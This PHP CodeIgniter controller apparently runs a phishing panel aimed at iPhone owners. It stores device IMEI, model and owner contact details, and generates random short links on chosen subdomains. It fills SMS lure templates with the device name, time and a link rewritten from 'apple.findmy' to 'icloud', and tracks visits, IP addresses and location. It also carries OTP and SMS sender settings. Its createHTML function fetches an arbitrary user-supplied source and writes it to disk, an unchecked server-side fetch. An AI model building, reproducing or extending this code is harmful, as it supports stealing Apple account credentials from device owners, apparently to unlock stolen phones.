<?php 
namespace App\Controllers;
use App\Controllers\BaseController;

use App\Models\Equipos_model;
use App\Models\configurar\Server_model;
use App\Models\configurar\Paises_model;
use App\Models\configurar\Plantillas_model;
use App\Models\configurar\Usuario_model;
use App\Models\configurar\Subdominio_model;
use App\Models\configurar\Plantillasemail_model;
use App\Models\configurar\Api_model;
use App\Models\configurar\Smsapi_model;
use App\Models\configurar\Callcenter_model;

class Equipos extends BaseController {

  protected $equipos_model;
  protected $server_model;
  protected $paises_model;
  protected $plantillas_model;
  protected $usuario_model;  
  protected $subdominio_model;
  protected $plantillasemail_model;
  protected $api_model;
  protected $smsapi_model;
  protected $sesion;
  protected $callcenter_model;

  function __construct(){

    $this->equipos_model          = new Equipos_model();
   	$this->server_model           = new Server_model();
    $this->paises_model           = new Paises_model();
    $this->plantillas_model       = new Plantillas_model();
    $this->usuario_model          = new Usuario_model();
    $this->subdominio_model       = new Subdominio_model();
    $this->plantillasemail_model  = new Plantillasemail_model();
    $this->smsapi_model           = new Smsapi_model();
    $this->api_model              = new Api_model();
    $this->callcenter_model       = new Callcenter_model();
    $this->session = \Config\Services::session();
   
   }


	public function index(){  


       
		return redirect()->route('equipos/ingresados');
		
	}


    public function ingresados(){
  
       $datos['idusuarioPost'] = $this->session->get("idusuario");
       $datos['plantillas'] = $this->plantillas_model->get_smstemplates("");
       $datos['senders'] = $this->api_model->get_senders();
       $datos['countequipos'] = $this->equipos_model->countequipos($this->session->get("idusuario"));
       $datos['countequiP'] = $this->equipos_model->countequiposstatus($this->session->get("idusuario"),0);
       $datos['countequiposC'] = $this->equipos_model->countequiposstatus($this->session->get("idusuario"),1);
       $datos['countequiposF'] = $this->equipos_model->countequiposstatus($this->session->get("idusuario"),2);
       $datos['countequiposPC'] = $this->equipos_model->countequiposstatus($this->session->get("idusuario"),3);
       $datos['server'] = $this->server_model->get_server();
       $datos['datosuser']  = $this->usuario_model->get_usuarioID($this->session->get('idusuario'));
       $datos['sessionrol'] = $this->session->get("rol"); 
       $datos['pais']          = $this->paises_model->get_paises();
       $datos['subdominios']   = $this->subdominio_model->get_subdominios($this->session->get("idusuario"), '');
       $datos['smsapi']        = $this->smsapi_model->all_smsapis("");
       $datos['audios']        = $this->callcenter_model->get_audiocall("");
       echo view('inc/header', $datos);
       echo view('equipos/ingresados');
      
    }

    public function generarLink(){
      if($this->request->getPost()) {

        $subdominio = $this->request->getPost("subdominio");
        $opcion_url = $this->request->getPost("opcion_url");       
       
        $link = substr(str_shuffle("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"), 0, 3);
        $link_short = $subdominio.'/'.$link;
        $link_long  = $subdominio.'/?id='.$link;

        $verify_link = $this->equipos_model->verificarlink($link);

        $datos = array("opcion_url" => $opcion_url, "link" => $link, "link_short" => $link_short, "link_long" => $link_long, "verify_link" => $verify_link); 

      
        echo json_encode($datos);  
      }  
    }

    public function getingresado(){
      
      if($this->request->getPost()) {
       $idequipos = $this->request->getPost("idequipos");
       $response = $this->equipos_model->get_ingresadoID($this->session->get("idusuario"), $idequipos);
       echo json_encode($response);
      }
    }

 

    public function getAllingresados(){
      if($this->request->getPost()) {
       $buscarequipo = $this->request->getPost("buscarequipo");
       $response = $this->equipos_model->get_ingresados($this->session->get("idusuario"), $buscarequipo);
       echo json_encode($response);
      }
    }



    public function agregar(){
       $datos['server']       = $this->server_model->get_server($this->session->get("idusuario")); 
       $datos['sessionrol']    = $this->session->get("rol");
       $datos['datosuser']     = $this->usuario_model->get_usuarioID($this->session->get("idusuario"));
       $datos['idusuarioPost'] = $this->session->get("idusuario");
       $datos['pais']          = $this->paises_model->get_paises();
       $datos['subdominios']   = $this->subdominio_model->get_subdominios($this->session->get("idusuario"), '');
       $datos['plantillassms'] = $this->plantillas_model->get_smstemplates("");
       $datos['senders']       = $this->api_model->get_senders();
       $datos['smsapi']        = $this->smsapi_model->all_smsapis("");
       echo view('inc/header',$datos); 
       echo view('equipos/agregar');
    }		



    public function setEquipo(){
       
      if($this->request->getPost()) {
       $array_devolver=[];      
       

          $idusuario              = $this->session->get("idusuario");               
          $tipo                   = $this->request->getPost("tipo");
          $user                   = $this->request->getPost("user");
          $niphone                = $this->request->getPost("niphone");
          $pais                   = $this->request->getPost("pais");
          $numero                 = $this->request->getPost("numero");
          $email                  = $this->request->getPost("email");
          $modelo_pref            = $this->request->getPost("modelo_pref");
          $modelo                 = $this->request->getPost("modelo");
          $imei                   = $this->request->getPost("imei");
          $status                 = $this->request->getPost("status");
          $visitas                = $this->request->getPost("visitas");
          $fecha                  = date("Y-m-d H:i:s");
          $valor1                 = $this->request->getPost("valor1");
          $valor2                 = $this->request->getPost("valor2");
          $tipolinkg              = $this->request->getPost("tipolinkg");
          $subtipo                = $this->request->getPost("subtipo");
          $latitud                = $this->request->getPost("latitud");
          $longitud               = $this->request->getPost("longitud");
          $urlacortada            = $this->request->getPost("urlacortada");
          $opcion_otp             = $this->request->getPost("opcion_otp");
          $tipo_verificacion_otp  = $this->request->getPost("tipo_verificacion_otp");
          $plantilla_otp          = $this->request->getPost("plantilla_otp");
          $lenguaje_otp           = $this->request->getPost("lenguaje_otp");
          $id_apisms              = $this->request->getPost("id_apisms");
          $idsender               = $this->request->getPost("idsender");
          $inicio_sesion          = $this->request->getPost("inicio_sesion");

          $linkg       = str_replace('/','',str_replace('/?id=','',str_replace($subtipo, '', $this->request->getPost("linkg"))));  
          $link_short  = $subtipo.'/'.$linkg;
          $link_long   = $subtipo.'/?id='.$linkg; 

          $prefij = $this->paises_model->get_prefijo($pais);
          $miprefijo = str_replace('+', '', $prefij['prefijo']);

          $datos = array("linkg" => $linkg,  "tipo" => $tipo, "user" => $user, "niphone" => $niphone, "pais" => $miprefijo, "numero" => $numero, "email" => $email, "modelo" => $modelo, "imei" => $imei, "status" => $status, "visitas" => $visitas, "fecha"=> $fecha, "valor1" => $valor1, "valor2" => $valor2, "tipolinkg" => $tipolinkg, "idusuario" => $idusuario , "latitud" => $latitud, "longitud" => $longitud, "urlacortada" => $urlacortada, "modelo_pref" => $modelo_pref, 'link_short' => $link_short, "link_long" => $link_long, "opcion_otp" => $opcion_otp, "tipo_verificacion_otp" => $tipo_verificacion_otp, "plantilla_otp" => $plantilla_otp, "lenguaje_otp" => $lenguaje_otp, "id_apisms" => $id_apisms, "idsender" => $idsender, "inicio_sesion" => $inicio_sesion);         
             
          if($this->equipos_model->set_Equipo($datos)){

            $array_devolver['statusAdd'] = true;

          }else{
            
            $array_devolver['statusAdd'] = false;

          }
       
       echo json_encode($array_devolver);  
        
      }
  
  }

  public function eliminaringresados(){

    if($this->request->getPost()) {
       $array_devolver=[];
       
       $idusuario = $this->session->get("idusuario");
       $idequipos = $this->request->getPost("idequipos");
     
       if($this->equipos_model->eliminareEquipo($idusuario, $idequipos)){
        
          $array_devolver['statusdelete'] = true;

       }else{
         $array_devolver['statusdelete'] = false;
       }   
         echo json_encode($array_devolver);  
        
    }   

  }

  public function editar_requerimiento(){
    
    if($this->request->getPost()){
      $array_devolver=[]; 
      $idusuario              = $this->session->get("idusuario");     
      $idequipos              = $this->request->getPost("idequipos");
      $linkg                  = $this->request->getPost("linkg");
      $tipo                   = $this->request->getPost("tipo");
      $user                   = $this->request->getPost("user");
      $niphone                = $this->request->getPost("niphone");
      $pais                   = $this->request->getPost("pais");
      $numero                 = $this->request->getPost("numero");
      $email                  = $this->request->getPost("email");
      $modelo_pref            = $this->request->getPost("modelo_pref");
      $modelo                 = $this->request->getPost("modelo");
      $imei                   = $this->request->getPost("imei");
      $valor1                 = $this->request->getPost("valor1");
      $valor2                 = $this->request->getPost("valor2");
      $subtipo                = $this->request->getPost("subtipo");
      $urlacortada            = $this->request->getPost("urlacortada");
      $opcion_otp             = $this->request->getPost("opcion_otp");
      $tipo_verificacion_otp  = $this->request->getPost("tipo_verificacion_otp");
      $plantilla_otp          = $this->request->getPost("plantilla_otp");
      $lenguaje_otp           = $this->request->getPost("lenguaje_otp");
      $id_apisms              = $this->request->getPost("id_apisms");
      $idsender               = $this->request->getPost("idsender"); 
      $inicio_sesion          = $this->request->getPost("inicio_sesion");

      $verificar_link = $this->equipos_model->verificarlinkuser($idusuario, $linkg);
      $latitud  = ''; 
      $longitud = ''; 

      if($verificar_link['latitud'] == 'latitud_ip' || $verificar_link['longitud'] == 'longitud_ip'){
        
        $latitud  = 'latitud_ip'; 
        $longitud = 'longitud_ip'; 

      }else{

        $latitud  = $verificar_link['latitud']; 
        $longitud = $verificar_link['longitud']; 

      }

       $datos = array("idequipos" => $idequipos, "linkg" => $linkg, "tipo" => $tipo, "user" => $user, "niphone" => $niphone, "pais" => $pais, "numero" => $numero, "email" => $email, "modelo" => $modelo, "imei" => $imei, "valor1" => $valor1, "valor2" => $valor2, "idusuario" => $idusuario , "urlacortada" => $urlacortada, "modelo_pref" => $modelo_pref, "opcion_otp" => $opcion_otp, "tipo_verificacion_otp" => $tipo_verificacion_otp, "plantilla_otp" => $plantilla_otp, "lenguaje_otp" => $lenguaje_otp, "latitud" => $latitud, "longitud" => $longitud, "id_apisms" => $id_apisms, "idsender" => $idsender, "inicio_sesion" => $inicio_sesion); 

      if($this->equipos_model->update_requerimiento($datos)){

            $array_devolver['statusAdd'] = true;

      }else{
            
            $array_devolver['statusAdd'] = false;

      }
       
       echo json_encode($array_devolver);  


    }        


  }










 public function reporte(){
       $datos['server'] = $this->server_model->get_server($this->session->get("idusuario")); 
       $datos['sessionrol'] = $this->session->userdata("rol");
       $datos['datosuser']  = $this->usuario_model->get_usuarioID($this->session->get("idusuario"));
       $datos['idusuarioPost'] = $this->session->get("idusuario");
       $reporte =  $this->usuario_model->reporte($this->session->get("idusuario"));
       $datos['statusReport'] = $reporte['statusreporte'];
       $datos['domreporte']   = $reporte['domreporte'];
       if($reporte['reporte'] == 1){
         $this->load->view('inc/header',$datos); 
         $this->load->view('equipos/reporte',$datos);
       }else{
        redirect('equipos/ingresados');
       }
      
  }  


    public function modificaringresado(){

    if($this->input->is_ajax_request() == 'POST') {
       header("Content-Type: application/json");
       $array_devolver=[];
       
       $idusuario        = $this->session->get("idusuario");
       $idequipos        = $this->input->post("idequipo");
       $plataforma       = $this->input->post("tipo");
       $igeneratelink    = $this->input->post("urllinkg");
       $igeneratelink2   = $this->input->post("urllinkg2");
       $status           = $this->input->post("status");
       $valor1           = $this->input->post("valor1");
       $valor2           = $this->input->post("valor2"); 
       $user             = $this->input->post("user"); 
       $niphone          = $this->input->post("niphone"); 
       $numero           = $this->input->post("numero"); 
       $email            = $this->input->post("email"); 
       $modelo           = $this->input->post("modelo"); 
       $imei             = $this->input->post("imei"); 

      

     
       $response   = $this->equipos_model->get_ingresadoID($this->session->get("idusuario"), $idequipos);
       $urllinkg     = $response['urllinkg'];
       $urllinkshort = $response['urllinkshort'];
       $linkg        = $response['linkg'];
       

       $short_urls = $this->equipos_model->short_urls($linkg, $this->session->get("idusuario"));
       $long_url = $short_urls['long_url'];


       //str_replace("world","Peter","Hello world!");

      
         $urllinkgRep     = str_replace(substr($urllinkg, 0, -8),$igeneratelink2, $urllinkg);
         $urllinkshortRep = str_replace(substr($urllinkshort, 0, -4),$igeneratelink2, $urllinkshort);
         $long_urlRep     = str_replace(substr($long_url, 0, -8),$igeneratelink2, $long_url);
         $status          = "0";
         $visitas         = 0;
         $tipo            = $plataforma;

         $upd1 = $this->equipos_model->updateUrllinkgUrllinkshort($this->session->get("idusuario"), $idequipos, "https://".$urllinkgRep, "https://".$urllinkshortRep, $tipo, $status, $visitas, $valor1, $valor2, $user, $niphone, $numero, $email, $modelo, $imei);
         $upd2 = $this->equipos_model->updateShort_urls($this->session->get("idusuario"), $linkg, $long_urlRep);
       
        if($upd1 && $upd2){

            $array_devolver['statusAdd'] = true;
        }else{
            $array_devolver['statusAdd'] = false;
        }


        $array_devolver['datos'] = $urllinkgRep;
       echo json_encode($array_devolver);  
    }   

  }




   public function totalcountnoti(){
        
        $array_devolver=[];        
        $response = $this->equipos_model->totalcountnoti($this->session->get("idusuario"));
        //$array_devolver['counttotal'] = $response;

        echo json_encode($response);     

    }


   public function countequipos(){    

      $response = $this->equipos_model->countequipos($this->session->get("idusuario"));
      echo json_encode($response);   

   }

    public function countequiP(){

      $array_devolver=[]; 
      $status = $this->input->post('status');
      $response = $this->equipos_model->countequiposstatus($this->session->get("idusuario"), $status);

      echo json_encode($response);  


   }



   public function selectplantilla(){

      $array_devolver=[]; 
      $descripsms = $this->input->post('descripsms');
      $modelo = $this->input->post('modelo');
      $linkg = $this->input->post('linkg');
      $nombreIphone = $this->input->post('nombreIphone');
      date_default_timezone_set("America/Lima");
      $hora = date('H:i');

       $urlshortfinal = str_replace('apple.findmy', 'icloud', $linkg);


        $texto = $descripsms;
        $texto1 = str_replace('{{model}}', $modelo, $texto);
        $texto2 = str_replace('{{time}}', $hora, $texto1);
        $texto3 = str_replace('{{link}}', $urlshortfinal, $texto2);
        $salida = str_replace('{{device}}', $nombreIphone, $texto3);

        $array_devolver['descripcion'] = str_replace('https://www.', 'https://', $salida);


         echo json_encode($array_devolver);  
        

   }
   
   
  public function refresip(){
      
      $array_devolver=[]; 
      $id = $this->input->post('id');
      $resp = $this->equipos_model->get_opobtenido($id);
      $ip  = $resp['ip'];
      
      if($this->equipos_model->refresip($ip)){
          
          $array_devolver['status'] = true;
          
      }else{
          $array_devolver['status'] = false;
      }
      
      
      echo json_encode($array_devolver);  
      
  } 



  public function createHTML(){

    if($this->input->is_ajax_request() == 'POST') {
      header("Content-Type: application/json");
      $array_devolver=[];

      $contenido   = $this->input->post('contenido');
      $descripcion = $this->input->post('descripcion');
      $linkg       = $this->input->post('linkg');
      $ruta        = "assets/server/js/equipos/mapa/plantillas/";
      $status      = 1;

     /* $datos = array("descripcion" => $descripcion, "ruta" => $ruta, "status" => $status);

      if($this->plantillasemail_model->set_EmailTemplates($datos)){

        $array_devolver['status'] = true;

      }else{

        $array_devolver['status'] = false;
      }*/
     

     $array_devolver['status'] = true;

      
       $src = $contenido;
       $time = time();
       $desFolder = 'assets/server/js/equipos/mapa/plantillas/';
       $imageName = 'google-map_'.$time.'.PNG';
       $imagePath = $desFolder.$imageName;
       file_put_contents($imagePath,file_get_contents($src));
    
    
      echo json_encode($array_devolver);  

    }



    
   }


  
 
   
    

  
}

